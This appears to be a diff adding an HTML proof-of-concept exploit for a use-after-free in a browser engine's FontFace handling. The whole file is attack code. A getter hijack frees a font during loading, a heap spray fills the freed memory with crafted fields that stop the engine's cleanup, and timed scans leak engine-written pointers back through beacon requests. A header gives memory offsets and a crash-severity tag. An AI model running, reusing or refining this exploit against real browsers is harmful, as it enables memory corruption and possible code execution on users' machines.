@@ -1,0 +1,101 @@
+<!--
+  p580: Single-session FontFace UAF with vincenzoiacovone safety fields.
+  Pre-fills spray buffers so engine doesn't crash when it walks our lane.
+
+  Safety fields (from vincenzoiacovone 14.10 bench, issue #168):
+    +0x00: rc=2 (engine bumps to 3 = hit witness)
+    +0x58: 0 (null table, engine writes T here)
+    +0x60: opCount=0 (prevent amortizedCleanupIfNeeded)
+    +0x64: maxOp=0xFFFFFFFF (prevent cleanup threshold)
+    +0x68: 0 (engine writes W here)
+    +0x82: 3 (Status::Success, pump is no-op)
+
+  Two scans at 60ms and 400ms (vincenzoiacovone timing).
+  Reports the triple: rc, T(+0x58), W(+0x68), kc(+0x50).
+
+  Expected beacons:
+    G         = start
+    PC        = pre-churn done
+    F         = font freed inside getter
+    S<n>      = spray done
+    H<i>,rc=<d>,T=<hex>,W=<hex>,kc=<d>  = hit at buffer i
+    MISS      = no hit at this scan
+    ALIVE     = survived 500ms
+    ALIVE2    = survived 2000ms
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function h(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+
+function main(){
+b('G');
+var pc=new FontFace('pc','local(Arial)',{unicodeRange:'U+0043'});
+document.fonts.add(pc);pc.load();
+pc.loaded.then(function(){
+  try{document.fonts.delete(pc);}catch(e){}
+  document.body.offsetHeight;
+  b('PC');
+  trigger();
+},function(){trigger();});
+}
+
+function trigger(){
+var A=new FontFace('fl','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A);void A.loaded;window._r=[A];
+var e=document.createElement('style');
+e.textContent="@font-face{font-family:sl;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(e);
+var f=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(f)return;f=1;
+if(e)e.remove();
+try{document.fonts.delete(this);}catch(x){}
+document.body.offsetHeight;
+b('F');
+var a=[];
+for(var k=0;k<48;k++){
+  var u=new Uint8Array(new ArrayBuffer(192));
+  wD(u,0x00,2);
+  wD(u,0x60,0);
+  wD(u,0x64,0xFFFFFFFF);
+  u[0x82]=3;
+  a.push(u);
+}
+b('S'+a.length);
+window._a=a;
+return;},set:function(){}});
+document.fonts.load('1em fl, sl','AB').then(function(){},function(){});
+var d=0;
+function sc(tag){
+  if(d)return;
+  var a=window._a;if(!a)return;
+  for(var i=0;i<a.length;i++){
+    var v=a[i],rc=rD(v,0);
+    if(rc!==2){
+      d=1;
+      var T=h(v,0x58),W=h(v,0x68),kc=rD(v,0x50);
+      b(tag+'H'+i+',rc='+rc+',T='+T+',W='+W+',kc='+kc);
+      return;
+    }
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(t0){
+      d=1;
+      var T=h(v,0x58),W=h(v,0x68),kc=rD(v,0x50),rc2=rD(v,0);
+      b(tag+'H'+i+',rc='+rc2+',T='+T+',W='+W+',kc='+kc);
+      return;
+    }
+  }
+  b(tag+'MISS');
+}
+setTimeout(function(){sc('A');},60);
+setTimeout(function(){sc('B');},400);
+setTimeout(function(){sc('C');},1000);
+setTimeout(function(){b('ALIVE');},500);
+setTimeout(function(){b('ALIVE2');},2000);
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
